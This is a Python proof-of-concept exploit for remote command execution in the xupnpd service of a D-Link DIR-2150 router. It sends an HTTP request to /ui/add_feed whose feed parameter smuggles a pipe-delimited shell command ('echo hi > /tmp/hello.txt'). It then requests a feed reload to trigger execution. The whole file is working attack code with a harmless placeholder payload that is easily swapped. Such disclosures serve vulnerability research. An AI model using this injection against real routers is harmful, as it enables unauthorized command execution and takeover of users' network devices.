#!/usr/bin/env python
"""
dlink dir-2150 xupnpd rce
"""
from socket import *
import sys
import urllib
import telnetlib
import time

host='192.168.0.1'
port=4044


sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))
sock.settimeout(3)

feed=urllib.pathname2url('192.168.0.144:4142/|echo hi > /tmp/hello.txt|')
name=urllib.pathname2url('zz.m3u')
s='GET /ui/add_feed?plugin=dreambox&feed=%s&name=%s HTTP/1.1\r\n' %( feed,name)
s+='Host: 192.168.0.1:4044\r\n'
s+='User-Agent: Mozilla/5.0\r\n'
s+='\r\n'

sock.sendall(s)

data=''
while 1:
    s=''
    try:
        s=sock.recv(11111)
    except:
        s=''
    if len(s)<1:
        break
    data+=s

print data
sock.close()

print 'reloading feeds'

time.sleep(1)

sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))
sock.settimeout(3)

s='GET /ui/reload_feeds HTTP/1.1\r\n'
s+='Host: 192.168.0.1:4044\r\n'
s+='User-Agent: Mozilla/5.0\r\n'
s+='\r\n'

sock.sendall(s)
print sock.recv(10000)
sock.close()
